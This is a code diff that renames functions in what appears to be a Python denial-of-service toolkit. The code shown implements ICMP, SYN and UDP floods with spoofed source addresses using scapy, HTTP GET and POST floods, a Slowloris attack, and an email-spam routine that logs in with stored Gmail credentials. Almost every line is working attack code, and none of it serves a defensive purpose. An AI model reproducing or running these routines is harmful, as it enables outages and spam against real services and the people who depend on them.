@@ -10,43 +10,43 @@ from globals import GMAIL_ACCOUNT_FILE, ICMP_PACKET_AMOUNT, SOCKET_COUNT
 from log import log
 from emailsender import MailSender
 
-def Spoof_IP():
+def spoof_ip():
     return RandIP()
 
-def randInt():
+def rand_int():
 	return random.randint(1000,9000)
 
 class Layer3:
     @staticmethod
-    def ICMP_Flood(target: str, time: int):
+    def icmp_flood(target: str, time: int):
         end_t = timing.time() + time
         IP_Packets = []
         for i in range(ICMP_PACKET_AMOUNT):
-            IP_Packets.append(scapy.all.IP(dst=str(target), src=Spoof_IP())/scapy.all.ICMP())
+            IP_Packets.append(scapy.all.IP(dst=str(target), src=spoof_ip())/scapy.all.ICMP())
         while(timing.time() < end_t):
             send(IP_Packets, verbose=0)
             time.sleep(8)
 
 class Layer4:
     @staticmethod
-    def SYN_Flood(target: str, port: int, time: int):
+    def syn_flood(target: str, port: int, time: int):
         end_t = timing.time() + time
-        IP_Packet = scapy.all.IP(dst=str(target), src=Spoof_IP())
-        TCP_Packet = scapy.all.TCP(sport=randInt(), dport=int(port), flags="S", seq=randInt(), window=randInt())
+        IP_Packet = scapy.all.IP(dst=str(target), src=spoof_ip())
+        TCP_Packet = scapy.all.TCP(sport=rand_int(), dport=int(port), flags="S", seq=rand_int(), window=rand_int())
         while(timing.time() < end_t):
             send(IP_Packet/TCP_Packet, verbose=0)
 
     @staticmethod
-    def UDP_Flood(target: str, port: int, time: int):
+    def udp_flood(target: str, port: int, time: int):
         end_t = timing.time() + time
-        IP_Packet = scapy.all.IP(dst=str(target), src=Spoof_IP())
-        UDP_Packet = scapy.all.UDP(sport=randInt(), dport=int(port))
+        IP_Packet = scapy.all.IP(dst=str(target), src=spoof_ip())
+        UDP_Packet = scapy.all.UDP(sport=rand_int(), dport=int(port))
         payload = "A" * 450
         while(timing.time() < end_t):
             send(IP_Packet/UDP_Packet/payload, verbose=0)
             
     @staticmethod
-    def EMAIL_Spam(target: str, time: int, message: str):
+    def email_spam(target: str, time: int, message: str):
         account, password = utils.get_gmail_account_from_file(GMAIL_ACCOUNT_FILE)
         mail_sender = MailSender(account, password)
         mail_sender.connect()
@@ -58,13 +58,13 @@ class Layer4:
         
 class Layer7:
     @staticmethod
-    def HTTP_GET_Flood(target: str, time: int):
+    def http_get_flood(target: str, time: int):
         end_t = timing.time() + time
         while(timing.time() < end_t):
              x = requests.get(target)
 
     @staticmethod
-    def HTTP_POST_Flood(target: str, time: int, payload: str):
+    def http_post_flood(target: str, time: int, payload: str):
         end_t = timing.time() + time
         payload = json.loads(payload)
         while(timing.time() < end_t):
@@ -90,7 +90,7 @@ class Layer7:
         return s
 
     @staticmethod
-    def SLOW_Loris(target, port, time):
+    def slow_loris(target, port, time):
         list_of_sockets = []
         end_t = timing.time() + time
 
